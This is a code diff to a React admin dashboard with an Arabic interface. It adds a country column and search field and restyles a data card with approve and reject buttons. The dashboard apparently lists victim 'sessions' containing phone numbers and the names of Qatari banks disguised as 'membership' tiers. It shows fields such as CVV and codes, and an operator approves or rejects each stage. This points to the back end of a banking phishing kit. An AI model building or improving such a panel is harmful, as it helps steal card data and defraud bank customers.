@@ -30,6 +30,7 @@ import {
   Check,
   X,
   LayoutDashboard,
+  MapPin,
 } from "lucide-react";
 
 export default function AdminDashboard() {
@@ -77,7 +78,7 @@ export default function AdminDashboard() {
       });
       toast.success(action === 'approve' ? "تم القبول" : "تم الرفض");
       refetch();
-      // تحديث الجلسة المختارة لتعكس الحالة الجديدة
+      // Update selected session to reflect new state
       if (selectedSession && selectedSession.id === sessionId) {
         const updatedSessions = await refetch();
         const updated = updatedSessions.data?.find((s: any) => s.id === sessionId);
@@ -91,9 +92,11 @@ export default function AdminDashboard() {
   const filteredSessions = sessions?.filter((s) => {
     const phone = s.personalData?.phoneNumber || "";
     const bank = s.selectedBank || "";
+    const country = s.personalData?.country || "";
     return (
       phone.toLowerCase().includes(searchTerm.toLowerCase()) ||
-      bank.toLowerCase().includes(searchTerm.toLowerCase())
+      bank.toLowerCase().includes(searchTerm.toLowerCase()) ||
+      country.toLowerCase().includes(searchTerm.toLowerCase())
     );
   });
 
@@ -189,6 +192,7 @@ export default function AdminDashboard() {
                 <TableRow>
                   <TableHead className="text-right">رقم الهاتف</TableHead>
                   <TableHead className="text-right">نوع العضوية</TableHead>
+                  <TableHead className="text-right">البلد</TableHead>
                   <TableHead className="text-right">المرحلة الحالية</TableHead>
                   <TableHead className="text-right">الحالة</TableHead>
                   <TableHead className="text-center">الإجراءات</TableHead>
@@ -202,6 +206,12 @@ export default function AdminDashboard() {
                       {session.selectedBank === 'qnb' ? 'العضوية الفضية' : 
                        session.selectedBank === 'cbq' ? 'العضوية الذهبية' : 
                        session.selectedBank === 'dib' ? 'العضوية البلاتينية' : session.selectedBank?.toUpperCase() || "—"}
+                    </TableCell>
+                    <TableCell className="font-bold">
+                      <div className="flex items-center gap-2">
+                        <MapPin className="w-4 h-4 text-slate-400" />
+                        {session.personalData?.country || "—"}
+                      </div>
                     </TableCell>
                     <TableCell>
                       <span className="px-3 py-1 bg-blue-50 text-blue-600 rounded-full text-xs font-bold">
@@ -331,33 +341,40 @@ export default function AdminDashboard() {
 
 function DataSection({ title, icon, data, onAccept, onReject }: any) {
   return (
-    <div className="bg-white rounded-3xl border border-slate-200 shadow-sm overflow-hidden flex flex-col">
-      <div className="p-5 bg-slate-50 border-b border-slate-100 flex items-center justify-between">
-        <div className="flex items-center gap-3">
-          <div className="p-2 bg-white rounded-lg shadow-sm text-[#8C0032]">{icon}</div>
-          <h3 className="font-black text-slate-800 text-sm">{title}</h3>
+    <div className="bg-white rounded-3xl border border-slate-200 overflow-hidden shadow-sm hover:shadow-md transition-shadow">
+      <div className="bg-slate-50 px-6 py-4 border-b border-slate-100 flex items-center justify-between">
+        <div className="flex items-center gap-2 font-bold text-slate-800">
+          <div className="bg-[#8C0032]/10 p-1.5 rounded-lg text-[#8C0032]">
+            {icon}
+          </div>
+          {title}
+        </div>
+        <div className="flex gap-2">
+          <Button 
+            size="sm" 
+            variant="outline" 
+            className="h-8 w-8 p-0 rounded-full border-emerald-200 text-emerald-600 hover:bg-emerald-50"
+            onClick={onAccept}
+          >
+            <Check className="w-4 h-4" />
+          </Button>
+          <Button 
+            size="sm" 
+            variant="outline" 
+            className="h-8 w-8 p-0 rounded-full border-rose-200 text-rose-600 hover:bg-rose-50"
+            onClick={onReject}
+          >
+            <X className="w-4 h-4" />
+          </Button>
         </div>
       </div>
-      <div className="p-6 space-y-4 flex-1">
-        {Object.entries(data).map(([key, value]: any) => (
-          <div key={key} className="flex justify-between items-center border-b border-slate-50 pb-3 last:border-0">
-            <span className="text-xs font-bold text-slate-400">{key}</span>
-            <span 
-              className="text-sm font-black text-slate-800" 
-              dir={(key.includes("رقم") || key.includes("رمز") || key.includes("CVV") || key.includes("تاريخ")) ? "ltr" : undefined}
-            >
-              {value || "—"}
-            </span>
+      <div className="p-6 space-y-4">
+        {Object.entries(data).map(([label, value]: any) => (
+          <div key={label} className="flex flex-col gap-1">
+            <span className="text-[10px] font-bold text-slate-400 uppercase tracking-wider">{label}</span>
+            <span className="text-sm font-black text-slate-700 break-all">{value || "—"}</span>
           </div>
         ))}
-      </div>
-      <div className="p-4 bg-slate-50 grid grid-cols-2 gap-3">
-        <Button onClick={onAccept} className="bg-emerald-500 hover:bg-emerald-600 text-white font-bold rounded-xl h-11 gap-2">
-          <Check className="w-4 h-4" /> قبول
-        </Button>
-        <Button onClick={onReject} variant="destructive" className="font-bold rounded-xl h-11 gap-2">
-          <X className="w-4 h-4" /> رفض
-        </Button>
       </div>
     </div>
   );
